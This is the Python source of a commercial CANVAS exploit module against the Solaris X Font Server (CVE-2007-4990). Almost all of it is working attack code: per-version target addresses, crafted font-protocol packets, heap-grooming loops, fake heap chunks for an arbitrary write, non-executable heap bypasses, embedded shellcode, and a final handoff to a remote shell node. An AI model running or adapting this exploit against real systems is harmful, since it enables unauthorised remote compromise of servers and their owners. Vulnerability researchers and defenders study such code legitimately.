#!/usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys 
if "." not in sys.path: sys.path.append(".")

# Python dependencies
import os
import socket
import sys
import struct
import telnetlib

# CANVAS dependencies
from tcpexploit import tcpexploit
from exploitutils import *
from shellcode import shellcodeGenerator
from solarisNode import solarisNode
import solarisMosdefShellServer
from shellcode import solarisSPARCshellcodeGenerator

NAME = "xfs_swapchar2b"
DESCRIPTION= "Vulnerability in XFS allows for remote compromise as NOBODY user"
VERSION= "1.0"
DOCUMENTATION = {}
DOCUMENTATION["Date public"] = ""
DOCUMENTATION["Repeatability"] = "Infinite" #process is restarted by inetd on Solaris 10 at least
DOCUMENTATION["References"] = ""
DOCUMENTATION["Notes"] = ""
DOCUMENTATION["CVE Name"] = "CVE-2007-4990"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4990"
DOCUMENTATION['CVSS'] = 7.5


PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Solaris"] ]
PROPERTY["VERSION"]= ["10"] 

targets = {}
# TARGET[n] = [Name, ProcVector Dispatch Table (nm -x), WHAT, X86 True/False], Last Memleak Phase Byte Ordering, NonExec Heap 
targets[0] = ["SunOS DEBUG", 0xdeadbeefL, 0xbabebabeL, False, '>', False]
targets[1] = ["SunOS 5.10 Generic_118855-33 i86pc i386 i86pc", 0x0808540cL, 0x09000000L, True, '>', False]
targets[2] = ["SunOS 5.8  Generic_108528-27 sun4u sparc SUNW,Ultra-5_10", 0x0004c614L, 0x00900000L, False, '<', False]
targets[3] = ["SunOS 5.10 Generic_120011-14 sun4u sparc SUNW,Ultra-5_10", 0x0004e63cL, 0x00900000L, False, '>', False]
# 4 == NX heap SPARC
targets[5] = ["SunOS 5.9  Generic_118559-25 i86pc i386 i86pc", 0x080865ecL, 0x09000000L, True, '>', False]
# 6 == NX CPU INTEL

# Defating non-exec heap on sol10 .. take over oci->buffer to read packet into location we control
# in SPARC case .. we read into the PLT .. we wanna write at ProcVector + 12 .. then Dispatch() will

# take us to payload without things blowing up in realloc/free calls .. Payload lives at a known
# offset from ProcVector + 12 .. etc.

NOTES = """
0x00039764 in ReadRequest ()
1: x/i $pc  0x39764 <ReadRequest+32>:   ld  [ %l4 + 4 ], %i3
(gdb) i r l4
l4             0x111b50 1121104
(gdb) x/x $l4+4
0x111b54:       0x00111b30 <- oc-input -> oci (oci + 4 --> oci->buffer)
(gdb)

typedef struct _connectionInput {
    struct _connectionInput *next;
    char       *buffer;         /* contains current client input */
    char       *bufptr;         /* pointer to current start of data */
    int         bufcnt;         /* count of bytes in buffer */
    int         lenLastReq;
    int         size;
}           ConnectionInput, *ConnectionInputPtr;

%%i3 in readrequest is the oc->input .. oc->input+4 == oci->buffer

PoC:

Program received signal SIGTRAP, Trace/breakpoint trap.
0x0004e664 in ProcVector ()
(gdb) shell uname -a
SunOS lunar 5.10 Generic_120011-14 sun4u sparc SUNW,Ultra-5_10
(gdb) 

0x08071abb <ReadRequest+43>:    mov    0xfffffff0(%%ebp),%%eax
0x08071abe <ReadRequest+46>:    mov    0x4(%%eax),%%esi
0x08071ac1 <ReadRequest+49>:    mov    (%%eax),%eax

(gdb) si
0x08071aad in ReadRequest ()
1: x/i $pc  0x8071aad <ReadRequest+29>: mov    0x4(%%eax),%%eax
(gdb)

(gdb) x/x $eax+4
0x813385c:      0x08133878 <- oc-input -> oci + 4 == oci->buffer
(gdb) 

(gdb) x/x 0x8133878+4
0x813387c:      0x0812b2a0
^ WHERE
(gdb) 
"""

# Getting targets for Non Exec Heap targets SPARC
#
# WHERE: oci->buffer location .. get from ReadRequest .. see above notes
# WHAT: ProcVector Dispatch Table + 12
#
# non-exec heap targets ..
T = 0x0004e63c + 12 # for debugging ..
targets[4] = ["SunOS 5.10 Generic_120011-14 sun4u sparc SUNW,Ultra-5_10 [ NX Heap ]", 0x00111b34L, T, False, '>', True]


# Getting Targets for NX CPU targets INTEL
#
# INTEL NX CPU NOTES:
#
# WHERE: oci->buffer location .. get from ReadRequest .. see below
# WHAT: ld.so.1 page (pmap pid) == rwx

# NX intel
T = 0xD33FB100 # ld.so.1 RWX + 0x100 == page that has ptr we want to own
targets[6] = ["SunOS 5.10 Generic_118855-33 i86pc i386 i86pc [ NX CPU ]", 0x0813387c, T, True, '>', True]

def get_version_from_os(t_os):
    """
    t_os is a canvasos object of our target
    
    Returns version number on success, None on failure
    Zero is invalid result (autohack number)
    """
    if t_os.base.upper() != "SOLARIS":
        return None
    
    if t_os.arch.upper() == "X86":
        if t_os.version == "10":
            return 6 # return NX version for AutoHack .. more likely ..
        if t_os.version == "9":
            return 5 

    if t_os.arch.upper() == "SPARC":
        if t_os.version == "8":
            return 2
        if t_os.version == "10":
            return 4 #Non-exec should always work

    return None 

class xfs_common:
    """ common xfs routines """
    
    def __init__(self, parent):
        self.parent = parent
        self.host = parent.host
        self.port = parent.port
        self.what = parent.what
        self.where = parent.where
        self.order = parent.order # ordering for len vals on last memleak

        self.XFSPort = parent.port
        self.XFSHost = parent.host
        self.parent = parent  #for getting tcp sockets and other fun
        self.log = parent.log #we need a log function from our parent
        self.debug = False
        return
    
    def send_recv(self, sck, packet, print_en=0):
        """ sends/recv padded packets """
        
        pad = len(packet) % 4
        if pad:
            packet += "\x00"* (4 - pad)

        sck.send(packet)
        b = sck.recv(0x4000)

        if print_en:
            for each in b:
                print "%.2x" % ord(each),
            print ""
            
        return b

    def connectXFS(self):
        """ connect to XFS """
        
        # needs error handling and MOSDEFSock
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.parent.gettcpsock()
        s.connect((self.XFSHost, self.XFSPort))
        return s
    
    def sendInitPacket(self, sck):
        """ sends XFS init packet """
        
        self.log("[*] Sending XFS init packet ...")
        packet = '\x6c\x00\x01\x00\x00\x00\x00\x00'
        
        return self.send_recv(sck, packet)
    
    def sendProcOpenBitmapFontPacket(self, sck):
        """ sends ProcOpenBitmapFont Packet """
        
        self.log("[*] Sending ProcOpenBitmapFont packet ...")
        font_name = "9x15" 
        packet = ""
        packet += "\x0f" #reqType
        packet += "\x00" #pad
        packet += struct.pack("<H", ((0x11 + len(font_name) + 3) >> 2)) #len
        packet += struct.pack("<L", 0x1) #FID, set FID here!
        packet += struct.pack("<L", 0x1f) #format_mask
        packet += struct.pack("<L", 0x3) #format_hint
        packet += struct.pack("<B", len(font_name))
        packet += font_name

        return self.send_recv(sck, packet)

    def sendProcQueryXBitmapsPacket(self, sck):
        """ sends ProcQueryXBitmapPacket """
        
        self.log("[*] Sending ProcQueryXBitmaps packet")
        plen = 0x1000
        packet = ""
        packet += "\x14" #dispatch table index, use the second index of ProcQueryXBitmaps
        packet += "\x00" #range: type bool
        packet += struct.pack("<H", ((12 + plen)>>2)) #len
        packet += struct.pack("<L", 0x1) #fid, a valid FID!
        packet += struct.pack("<L", 0x1000L)
        packet += struct.pack("<L", (0x1020/2) - 6 )  #nranges: number of SHORTs

        packet += "A"*plen

        return self.send_recv(sck, packet)
    
    def memleak_phase_zero(self, sck):
        """ phase 0 of memleaks """
        
        authname = "hp-hostname-1\x00"
        authdata = "B"*124
        
        cnt = 0
        self.log("[-] memleak phase 0 leaking 1000 of 128 byte sized chunks")
        while cnt < 1000:
            plen = len(authname) + len(authdata) + 4
            payload = ""
            payload += "\x08" #dispatch index
            payload += "\x01" #num_auths
            payload += struct.pack("<H", ((10 + plen)>>2)) #len
            payload += struct.pack("<L", cnt) #acid stuff

            payload += struct.pack(">H", len(authname))
            payload += struct.pack(">H", len(authdata))
      
            payload += authname 
            payload += authdata
      
            self.send_recv(sck, payload, print_en=0)
            
            cnt += 1
        
        return
    
    def memleak_phase_one(self, sck):
        """ phase 1 of memleaks """
        
        authname = "hp-hostname-1\x00"
        authdata = "C"*(0x100 - 4)
        cnt = 0
        
        self.log("[-] memleak phase 1 leaking 1000 of 256 bytes sized chunks")
        while cnt < 1000:
            plen = len(authname) + len(authdata) + 4
            payload = ""
            payload += "\x08" #dispatch index
            payload += "\x01" #num_auths
            payload += struct.pack("<H", ((10 + plen)>>2)) #len
            payload += struct.pack("<L", cnt) #acid stuff

            payload += struct.pack(">H", len(authname))
            payload += struct.pack(">H", len(authdata))
 
            payload += authname 
            payload += authdata
      
            self.send_recv(sck, payload, print_en=0) 

            cnt += 1
            
        return
    
    def trigger_t_delete_new_sock(self):
        """ triggers the t_delete on new connect """
        s = self.connectXFS()
        return s
    
    def sendProcNoopPacket(self, sck):
        """ sends just the ProcNoop packet without init """
        
        self.log("[*] Sending ProcNoop packet")
        plen = 0x10
        packet = ""
        packet += "\x00" #ProcNoop
        packet += "\x00" #pad
        packet += struct.pack("<H", ((4 + plen)>>2)) #len
        packet += "A"*plen

        sck.send(packet)
        return       
        
    def trigger_ProcNoop(self, sck):
        """ triggers a ProcNoop call that triggers the owned Dispatch table entry """
            
        self.log("[*] Initing new connection for ProcNoop trigger ...")
        self.sendInitPacket(sck)
        
        self.log("[*] Sending ProcNoop packet for shell dispatch")
        plen = 0x10
        packet = ""
        packet += "\x00" #ProcNoop
        packet += "\x00" #pad
        packet += struct.pack("<H", ((4 + plen)>>2)) #len
        packet += "A"*plen

        sck.send(packet)
        return
        
class xfs_i386(xfs_common):
    """ routines specific to i386 memory layout semantics """
    
    def __init__(self, parent): 
        xfs_common.__init__(self, parent)
        return
    
    def get_fake_chunk(self):
        fake_chunk = ""
        fake_chunk += struct.pack("<L", self.what) #0x09000000L) #[WHAT-32]
        fake_chunk += struct.pack("<L", 0x12345678L)
        fake_chunk += struct.pack("<L", 0xffffffffL)
        fake_chunk += struct.pack("<L", 0xaaaaaaa1L)
        fake_chunk += struct.pack("<L", 0xbbbbbbb1L)
        fake_chunk += struct.pack("<L", 0xccccccc1L)
        fake_chunk += struct.pack("<L", (self.where - 8)) #(0x080850d4L - 8)) # [WHERE-8] using realloc@plt x/x &ProcVector 0x808540c
        fake_chunk += struct.pack("<L", 0xeeeeeee1L)
        return fake_chunk
    
    def get_payload(self, fd=5):
        # we already know our fdval (5)
        sc = shellcodeGenerator.solaris_X86()
        sc.addAttr("known_fd_read_and_exec", { 'fd' : fd })
        # pad/align
        findsck_shellcode = ("\x41" * 40) + sc.get()

        if (len(findsck_shellcode) % 2):
            findsck_shellcode += "\x41"
            
        return findsck_shellcode
    
    # controls write4 .. has arch specific information ..
    def memleak_phase_two(self, sck):
        """ final memleak phase that has the chunks """

        authname = "hp-hostname-1\x00"
        authdata = ""
        
        fake_chunk = self.get_fake_chunk()
        authdata += fake_chunk
        
        findsck_shellcode = self.get_payload()
        
        authdata += "\xeb\x22" * ((0x1000 - len(fake_chunk) - len(findsck_shellcode)) / 2)
        authdata += findsck_shellcode

        cnt = 0
        self.log("[-] memleak phase 2 leaking 6000 of 4096 bytes sized chunks")
        while cnt < 6000:
            plen = len(authname) + len(authdata) + 4
            packet = ""
            packet += "\x08" #dispatch index
            packet += "\x01" #num_auths
            packet += struct.pack("<H", ((10 + plen)>>2)) #len
            packet += struct.pack("<L", cnt) #acid stuff

            packet += struct.pack(self.order + "H", len(authname))
            packet += struct.pack(self.order + "H", len(authdata))

            packet += authname
            packet += authdata
      
            self.send_recv(sck, packet, print_en=0)

            cnt += 1
            
        return

    def memleak(self, sck, phase=0):
        """ maps the memleak phases to functions """
        
        phasemap = { 0 : self.memleak_phase_zero, 1 : self.memleak_phase_one, 2 : self.memleak_phase_two }
        return phasemap[phase](sck)
    
    def own(self):
        """ walks through the steps to own solaris i386 xfs """
        
        # 1. connect and init
        s1 = self.connectXFS()
        try:
            self.sendInitPacket(s1)
    
            if self.debug == True:
                raw_input('XXX: attach to XFS process now')
                
            # 2. ProcOpenBitmap
            self.sendProcOpenBitmapFontPacket(s1)
            
            # 3. memleak phase 0
            self.memleak(s1, phase=0)
            
            # 4. memleak phase 1
            self.memleak(s1, phase=1)
            
            # 5. memleak phase 2 (controls chunks)
            self.memleak(s1, phase=2)
            
            # 6. ProcXQueryBitmap
            self.sendProcQueryXBitmapsPacket(s1)
            
            # 7. get new connection for trigger
            s2 = self.trigger_t_delete_new_sock()
            
            # 8. close original sock to trigger free()
            s1.close()
            
            # 9. trigger ProcNoop on s2
            self.trigger_ProcNoop(s2) # this does not recv .
        except socket.error:
            self.log("Socket crashed - not a good sign")
            return None
 
        # check trigger response
        resp = s2.recv(0x4000)
        if 'GOOO' not in resp:
            s2 = 0
        else:
            print "[!] got trigger reply .."

        # 10. Handle shell/mosdef on s2
        return s2

    # keepint at /bin/ksh payload until we fix our solaris intel code
    def get_non_exec_payload(self):
        return self.get_payload(fd=5)
        #return "\x6a\x00\x68\x2f\x6b\x73\x68\x68\x2f\x62\x69\x6e\x8d\x04\x24\x6a\x08\x50\x6a\x05\xb8\x04\x00\x00\x00\xe8\x63\x00\x00\x00\x6a\x00\x6a\x09\x6a\x05\xb8\x3e\x00\x00\x00\xe8\x53\x00\x00\x00\x6a\x01\x6a\x09\x6a\x05\xb8\x3e\x00\x00\x00\xe8\x43\x00\x00\x00\x6a\x02\x6a\x09\x6a\x05\xb8\x3e\x00\x00\x00\xe8\x33\x00\x00\x00\x6a\x00\x68\x2f\x6b\x73\x68\x68\x2f\x62\x69\x6e\x8d\x1c\x24\x6a\x00\x53\x8d\x0c\x24\x6a\x00\x8d\x14\x24\x52\x51\x53\xb8\x3b\x00\x00\x00\xe8\x0c\x00\x00\x00\x6a\x00\xb8\x01\x00\x00\x00\xe8\x00\x00\x00\x00\x8b\xcc\xe8\xff\xff\xff\xff\xc3\x5a\x81\xc2\x0a\x00\x00\x00\x0f\x34\xc3"

    # controls write4 .. has arch specific information ..
    def send_non_exec_payload_and_pointers(self, sck):
        """ final memleak phase that has the chunks """

        authname = "hp-hostname-1\x00"
        authdata = ""
        
        findsck_shellcode = self.get_non_exec_payload()
        noop = "A" # branch sled
        
        if self.debug == True and 0:
            noop = "\xcc" # int3
            
        # debug offset
        align = 'P' * 2
        authdata = align
        
        l = 0x4142434c # ptr index finding
        n = 0

        # add to this, subtract from payload len room !!!
        p_off = 83
        while n < (0x200-(4-len(align))):
            if n == p_off*4: # pc control offset Dispatch()
                self.log("Setting LD.SO.1 magic pointer to: %X" % (self.what + 0x20c))
                authdata += struct.pack("<L", self.what + 0x20c)
            else:
                #authdata += struct.pack("<L", l)
                authdata += "\xeb\x0cAA" # jump style

            l += 1
            n += 4

        # end of debug
        
        self.log("LEN PAYLOAD: %d"% len(findsck_shellcode))
        
        authdata += noop * (0x200 - len(findsck_shellcode))
        authdata += findsck_shellcode      
        
        cnt = 0
        self.log("[!] sending non-exec payload packets ...")
        while cnt < 1:
            plen = len(authname) + len(authdata) + 4
            packet = ""
            packet += "\x08" #dispatch index
            packet += "\x01" #num_auths
            packet += struct.pack("<H", ((10 + plen)>>2)) #len
            packet += struct.pack("<L", cnt) #acid stuff

            # changed for sol 8 compat! needs > for sol10 write4
            packet += struct.pack(self.order + "H", len(authname))
            packet += struct.pack(self.order + "H", len(authdata))

            packet += authname
            packet += authdata

            # this triggers .. so does not expect a receive .. kthx
            sck.send(packet)

            cnt += 1
            
        return

    # same deal as fake_chunk .. keeping it arch dependant if steps start to hugely differ ...
    def own_non_exec(self):
        """ walks through the steps to own solaris intel NX CPU xfs """
        
        # 1. connect and init
        s1 = self.connectXFS()
        self.sendInitPacket(s1)

        if self.debug == True:
            raw_input('XXX: attach to XFS process now')
            
        # 2. ProcOpenBitmap
        self.sendProcOpenBitmapFontPacket(s1)
        
        # 3. memleak phase 0
        self.memleak(s1, phase=0)
        
        # 4. memleak phase 1
        self.memleak(s1, phase=1)
        
        # 5. memleak phase 2 (controls chunks)
        self.memleak(s1, phase=2)
        
        # 6. ProcXQueryBitmap
        self.sendProcQueryXBitmapsPacket(s1)
        
        # 7. trigger t_delete write4
        s2 = self.trigger_t_delete_new_sock()

        # patience .. we pointed oci->buffer to LD.SO.1 RWX page
        time.sleep(2)        

        max_tries = 0
        # keep original s1 open ! :>
        while max_tries < 5:
            self.log("Try %d/5"%max_tries)
            max_tries=max_tries+1
            try:
                s1 = self.connectXFS()
                self.sendInitPacket(s1)
                self.sendProcOpenBitmapFontPacket(s1)
                self.memleak(s1, phase=0)
                self.memleak(s1, phase=1)
                self.memleak(s1, phase=2)
                self.sendProcQueryXBitmapsPacket(s1)
                s1.close()
            except socket.error, e:
                if e[0] == 32:
                    s2.close()
                    #s1.close()
                    
                    # on Broken Pipe .. likely success ...
                    self.log("[!] Broken Pipe - LIKELY SUCCESS !!!")

                    # 8. send the overwriting data into the LD.SO.1 RWX page
                    s1 = self.connectXFS()
                    self.sendInitPacket(s1)
                    self.sendProcOpenBitmapFontPacket(s1)
                    self.send_non_exec_payload_and_pointers(s1)

                    #print "halted ..";sys.stdin.read(1)

                    # 9. trigger the LD.SO.1 pointer
                    s2 = self.connectXFS()
                    self.sendInitPacket(s2)
                    resp = self.sendProcOpenBitmapFontPacket(s2) # trigger fp here

                    time.sleep(1)

                    # XXX: using regular shell for debug ...
                    if 0:
                        self.log("Intel NX shell baby!?!?!1 LOLOLOL")
                        t = telnetlib.Telnet()
                        t.sock = s2
                        t.write("\nuname -a;id\n")
                        t.interact()
                        sys.exit(0)
                    # XXX: end of shell interact
                    
                    if 'GOOO' not in resp:
                        s2 = 0 # failed
                    else:
                        print "[!] got NX trigger reply .."

                    return s2

#"""
#(gdb) bt
#0  0xcccccccc in ?? ()
#1  0xd33d3cbf in rt_bind_guard () from /lib/ld.so.1
#2  0xd33d98bf in enter () from /lib/ld.so.1
#3  0xd33e04e5 in elf_bndr () from /lib/ld.so.1
#4  0xd33cd1d4 in elf_rtbndr () from /lib/ld.so.1
#5  0xd32d0698 in ?? ()
#6  0x00000700 in ?? ()
#7  0xd325bcda in FindCachedFontPattern ()
#   from /usr/openwin/server/lib/libfont.so.1
#8  0x0805ca70 in OpenFont ()
#9  0x08057ae4 in ProcOpenBitmapFont ()
#10 0x080568d1 in Dispatch ()
#11 0x08056682 in main ()
#(gdb) 
#"""

        return None
    
class xfs_sparc(xfs_common):
    """ routines specific to SPARC memory layout semantics """
    
    def __init__(self, parent):
        xfs_common.__init__(self, parent)
        return
    
    # yea we can make this in xfs_common with endian control
    # but might want more specific control later on ... so keep it arch dependent
    def get_fake_chunk(self):
        fake_chunk = ""
        fake_chunk += struct.pack(">L", self.what) #0x09000000L) #[WHAT-32]
        fake_chunk += struct.pack(">L", 0xffffffffL)
        fake_chunk += struct.pack(">L", 0xffffffffL)
        fake_chunk += struct.pack(">L", 0xffffffffL)
        fake_chunk += struct.pack(">L", 0xffffffffL)
        fake_chunk += struct.pack(">L", 0xffffffffL)
        fake_chunk += struct.pack(">L", (self.where - 8)) #(0x080850d4L - 8)) # [WHERE-8] using realloc@plt x/x &ProcVector 0x808540c
        fake_chunk += struct.pack(">L", 0xffffffffL)
        return fake_chunk
    
    def get_payload(self):
        findsck_shellcode =\
        "\xa4\x1c\x40\x11"*60
               
        from shellcode import solarisSPARCshellcodeGenerator

        sc = solarisSPARCshellcodeGenerator.solarisSparc()
        # known fd val is 5
        sc.addAttr("mov_val_to_reg", { 'VAL' : 5, 'REG' : '%g4' })
        sc.addAttr("recv_exec", None)
        findsck_shellcode += sc.get()
        
        return findsck_shellcode

    def get_non_exec_payload(self):
        """ for the non_exec logic we end up with known fd 4, not 5 """
         
        #sc = solarisSPARCshellcodeGenerator.solarisSparc()
        # known fd val is 4 for non-exec ownage
        #sc.addAttr("mov_val_to_reg", { 'VAL' : 4, 'REG' : '%g4' })
        #sc.addAttr("recv_exec", None)
        
        # not needed, but is convenient ..
        sc = solarisSPARCshellcodeGenerator.solarisSparc()
        sc.addAttr("go_find_sock", None)
        findsck_shellcode = "\xa4\x1c\x40\x11" * 60 + sc.get()  
        
        return findsck_shellcode
    
    # controls write4 .. has arch specific information ..
    def memleak_phase_two(self, sck):
        """ final memleak phase that has the chunks """

        authname = "hp-hostname-1\x00"
        authdata = ""
        
        fake_chunk = self.get_fake_chunk()
        authdata += fake_chunk
        
        findsck_shellcode = self.get_payload()
        
        noop = "\x30\x80\x00\x0f" # branch sled
        
        if self.debug == True:
            noop = "\x91\xd0\x20\x01" # ta 1
            
        authdata += noop * ((0x1000 - len(fake_chunk) - len(findsck_shellcode)) / 4)
        authdata += findsck_shellcode

        cnt = 0
        self.log( "[-] memleak phase 2 leaking 6000 of 4096 bytes sized chunks")
        while cnt < 6000:
            plen = len(authname) + len(authdata) + 4
            packet = ""
            packet += "\x08" #dispatch index
            packet += "\x01" #num_auths
            packet += struct.pack("<H", ((10 + plen)>>2)) #len
            packet += struct.pack("<L", cnt) #acid stuff

            # changed for sol 8 compat! needs > for sol10 write4
            packet += struct.pack(self.order + "H", len(authname))
            packet += struct.pack(self.order + "H", len(authdata))

            packet += authname
            packet += authdata
      
            self.send_recv(sck, packet, print_en=0)

            cnt += 1
            
        return

    def memleak(self, sck, phase=0):
        """ maps the memleak phases to functions """
        
        phasemap = { 0 : self.memleak_phase_zero, 1 : self.memleak_phase_one, 2 : self.memleak_phase_two }
        return phasemap[phase](sck)
    
    # same deal as fake_chunk .. keeping it arch dependant if steps start to hugely differ ...
    def own(self):
        """ walks through the steps to own solaris sparc xfs """
        
        # 1. connect and init
        s1 = self.connectXFS()
        self.sendInitPacket(s1)

        if self.debug == True:
            raw_input('XXX: attach to XFS process now')
            
        # 2. ProcOpenBitmap
        self.sendProcOpenBitmapFontPacket(s1)
        
        # 3. memleak phase 0
        self.memleak(s1, phase=0)
        
        # 4. memleak phase 1
        self.memleak(s1, phase=1)
        
        # 5. memleak phase 2 (controls chunks)
        self.memleak(s1, phase=2)
        
        # 6. ProcXQueryBitmap
        self.sendProcQueryXBitmapsPacket(s1)
        
        # 7. get new connection for trigger
        s2 = self.trigger_t_delete_new_sock()
        
        # 8. close original sock to trigger free()
        s1.close()
        
        # 9. trigger ProcNoop on s2
        self.trigger_ProcNoop(s2)
        
        # 10. Handle shell/mosdef on s2
        return s2

    # controls write4 .. has arch specific information ..
    def send_non_exec_payload_and_pointers(self, sck):
        """ final memleak phase that has the chunks """

        authname = "hp-hostname-1\x00"
        authdata = ""
        
        # for non-exec logic we end up with fd 4, not 5 ..
        
        findsck_shellcode = self.get_non_exec_payload()
        noop = "\x30\x80\x00\x0f" # branch sled
        
        if self.debug == True and 0:
            noop = "\x91\xd0\x20\x01" # ta 1
            
        # debug offset
        align = 'P' * 2
        authdata = align
        
        l = 0x41424344
        n = 0
        while n < (0x100-(4-len(align))):
            if n == 23*4: # pc control offset Dispatch()
                authdata += struct.pack(">L", self.what + 7*4) # offset to start of payload in packet read ...
            else:
                #authdata += struct.pack(">L", l)
                authdata += noop
            l += 1
            n += 4
        # end of debug
        
        self.log("LEN PAYLOAD: %d"% len(findsck_shellcode))
        
        authdata += noop * ((0x300 - len(findsck_shellcode)) / 4)
        authdata += findsck_shellcode      
        
        cnt = 0
        self.log("[!] sending non-exec payload packets ...")
        while cnt < 1:
            plen = len(authname) + len(authdata) + 4
            packet = ""
            packet += "\x08" #dispatch index
            packet += "\x01" #num_auths
            packet += struct.pack("<H", ((10 + plen)>>2)) #len
            packet += struct.pack("<L", cnt) #acid stuff

            # changed for sol 8 compat! needs > for sol10 write4
            packet += struct.pack(self.order + "H", len(authname))
            packet += struct.pack(self.order + "H", len(authdata))

            packet += authname
            packet += authdata

            # this triggers .. so does not expect a receive .. kthx
            sck.send(packet)

            cnt += 1
            
        return
    
    # same deal as fake_chunk .. keeping it arch dependant if steps start to hugely differ ...
    def own_non_exec(self):
        """ walks through the steps to own solaris sparc xfs """
        
        # 1. connect and init
        s1 = self.connectXFS()
        self.sendInitPacket(s1)

        if self.debug == True:
            raw_input('XXX: attach to XFS process now')
            
        # 2. ProcOpenBitmap
        self.sendProcOpenBitmapFontPacket(s1)
        
        # 3. memleak phase 0
        self.memleak(s1, phase=0)
        
        # 4. memleak phase 1
        self.memleak(s1, phase=1)
        
        # 5. memleak phase 2 (controls chunks)
        self.memleak(s1, phase=2)
        
        # 6. ProcXQueryBitmap
        self.sendProcQueryXBitmapsPacket(s1)
        
        # 7. trigger t_delete write4
        s2 = self.trigger_t_delete_new_sock()
        
        max_tries=0
        # keep original s1 open ! :>
        while max_tries<5:
            self.log("Try %d/5"%max_tries)
            max_tries=max_tries+1
            try:
                s1 = self.connectXFS()
                self.sendInitPacket(s1)
                self.sendProcOpenBitmapFontPacket(s1)
                self.memleak(s1, phase=0)
                self.memleak(s1, phase=1)
                self.memleak(s1, phase=2)
                self.sendProcQueryXBitmapsPacket(s1)
                s1.close()
            except socket.error, e:
                if e[0] == 32:
                    #raw_input('XXX')
                    s2.close()
                    s1.close()
                    
                    # on Broken Pipe .. likely success ...
                    self.log("[!] Broken Pipe - LIKELY SUCCESS !!!")
                    s1 = self.connectXFS()
                    self.sendInitPacket(s1)
                    self.sendProcOpenBitmapFontPacket(s1)
                    
                    self.send_non_exec_payload_and_pointers(s1)
                    G = s1.recv(1000) # sends GOOO
                    if 'G' in G:
                        self.log("[!] GOT TRIGGER G!")
                        time.sleep(1)
                        s1.send('O')
                        break
                    else:
                        s1 = 0
                        break
                    
                    # XXX: using regular shell for debug ...
                    #t = telnetlib.Telnet()
                    #t.sock = s1
                    #t.write("\n\r")
                    #t.interact()
                    #sys.exit(0)
                    # XXX: end of shell interact
                    
                else:
                    self.log("[!] LIKELY FAIL !!!")
                    raw_input('debug halt ...')
                    s1 = 0
                    break
        
        return s1
    
class theexploit(tcpexploit):
    """
    XFS exploit class
    """
    
    def __init__(self):
        tcpexploit.__init__(self)
        self.port = 7100
        self.name = NAME
        return
    
    def test(self):
        """ test for vulnerable XFS service """

        self.getargs()        
        if self.portopen(self.port):
            ret = self.exploitnodes("osdetect")
            t_os = ret[0]
            self.log("OS detected is: %s"%t_os)
            self.version = get_version_from_os(t_os)
            if self.version: 
                return 1
        return 0
    
    def displayVersions(self):
        """ display versions from TARGETS dict """
        
        i = 0
        for key in targets:
            print "%d : %s"% (i, targets[key][0])
            i += 1
        return
    
    def getargs(self):
        """ gets arguments """
        self.parentnode = self.argsDict['passednodes'][0]
        self.version = int(self.argsDict.get('version', self.version))
        self.host = self.target.interface
        self.port = int(self.argsDict.get('port', self.port))
        
        return

    def run(self):
        """ runs exploit """
        
        xfs = None
        node_sock = 0
        
        self.getargs()
        if self.version == 0:
            ret = self.test()
            if not ret:
                self.log("xfs exploit unable to auto-version against this host")
                self.setInfo("%s unable to auto-version (failed)"%self.name)
                return 0
            
        self.version_name, self.where, self.what, self.i386, self.order, self.NX_heap = targets[self.version]
        self.log("Using target: %s"% self.version_name)
        
        if self.i386 == True:
            xfs = xfs_i386(self)
        else:
            xfs = xfs_sparc(self)
            
        if self.NX_heap == True:
            node_sock = xfs.own_non_exec()
        else:
            node_sock = xfs.own()
            
        # check for success
        if not node_sock:
            self.log("[!] failed ...")
            return 0
        else:
            self.succeeded=1
            
        if self.i386 == True:
            try:             
                self.log("Initing Solaris Intel MOSDEF Node ...")
                node = solarisNode()
                node.parentnode = self.parentnode
                solarisMosdefShellServer.solarisx86shellserver(node_sock, node, logfunction = self.logfunction)
                node.startup()
                return node
            except:
                self.log("[!] exception in node.startup() .. did you try an non-NX target against a NX solaris 10?")
            
        else:
            self.log("Initing Solaris SPARC MOSDEF Node ...")
            node = solarisNode()
            node.parentnode = self.parentnode
            solarisMosdefShellServer.solarisshellserver(node_sock, node, logfunction = self.logfunction)
            node.startup()
            return node        
            
        return 0

if __name__ == "__main__":
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
